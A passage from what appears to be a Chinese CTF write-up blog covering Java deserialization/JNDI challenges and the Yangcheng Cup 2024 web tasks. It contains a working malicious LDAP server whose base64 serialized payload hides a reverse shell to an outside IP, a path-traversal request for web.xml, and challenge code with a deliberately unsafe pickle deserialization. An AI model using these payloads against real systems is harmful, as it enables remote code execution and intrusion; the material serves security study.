class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="comment">//高版本LDAP绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://107.148.75.202:8000/#Evail&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAGnQAFm9yZy5leGFtcGxlLlVuc2VyaWFsXzF0AA9VbnNlcmlhbF8xLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AFXhzcgAeY29tLmFsaWJhYmEuZmFzdGpzb24uSlNPTkFycmF5AAAAAAAAAAECAAFMAARsaXN0cQB+AAd4cHNxAH4AFAAAAAF3BAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAcnK/rq+AAAAMwAaAQABQQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAGQS5qYXZhAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABwEABjxpbml0PgEAAygpVgwACQAKCgAIAAsBABFqYXZhL2xhbmcvUnVudGltZQcADQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA8AEAoADgARAQBhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TURjdU1UUTRMamMxTGpJd01pOHhNak0wSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAEwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABUAFgoADgAXAQAEQ29kZQAhAAIACAAAAAAAAQABAAkACgABABkAAAAaAAIAAQAAAA4qtwAMuAASEhS2ABhXsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHg=&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020青龙组-FileJava"><a href="#网鼎杯-2020青龙组-FileJava" class="headerlink" title="[网鼎杯 2020青龙组]FileJava"></a>[网鼎杯 2020青龙组]FileJava</h2><p>读web.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file_in_java/DownloadServlet?filename=../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CVE-20143529</p><h2 id="CISCN-2023-西南-seaclouds"><a href="#CISCN-2023-西南-seaclouds" class="headerlink" title="[CISCN 2023 西南]seaclouds"></a>[CISCN 2023 西南]seaclouds</h2><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18172377">https://www.cnblogs.com/EddieMurphy-blogs/p/18172377</a></p><p><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></p><p><a href="https://xz.aliyun.com/t/13345">https://xz.aliyun.com/t/13345</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/13279">https://xz.aliyun.com/t/13279</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/15801116.html">https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md">https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md">https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md</a></p><h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/13279">https://xz.aliyun.com/t/13279</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/15801116.html">https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2024 Web</title>
      <link href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-Web/"/>
      <url>/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯2024-Web-题解"><a href="#羊城杯2024-Web-题解" class="headerlink" title="羊城杯2024 Web 题解"></a>羊城杯2024 Web 题解</h1><p>总算没有爆零, 解出了两题, ez_java花费了太多时间, 还有一个tomtom2没做出来有点小遗憾</p><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>文件读取直接读&#x2F;proc&#x2F;self&#x2F;cmdline</p><p>然后就可以读源码了</p><p>lyrics.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, get_cookie</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = random.randbytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserData</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username</span>):</span><br><span class="line">        self.username = username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lyrics&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lyrics</span>():</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&#x27;text/plain; charset=UTF-8&#x27;</span></span><br><span class="line">    query = request.args.get(<span class="string">&quot;lyrics&quot;</span>)</span><br><span class="line">    path = os.path.join(os.getcwd() + <span class="string">&quot;/lyrics&quot;</span>, query)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">            res = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No lyrics found&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        user = UserData(username)</span><br><span class="line">        res = &#123;<span class="string">&quot;username&quot;</span>: user.username&#125;</span><br><span class="line">        <span class="keyword">return</span> set_cookie(<span class="string">&quot;user&quot;</span>, res, secret=secret_code)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/board&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">board</span>():</span><br><span class="line">    invalid = cookie_check(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> invalid:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope, invalid code get out!&quot;</span></span><br><span class="line">    data = get_cookie(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data)</span><br><span class="line">        data = <span class="built_in">str</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据源码import的包名, 把他们也读出来</p><p>cookie.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response, request</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line">basestring = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quoted from python bottle template, thanks :D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, -<span class="number">1</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    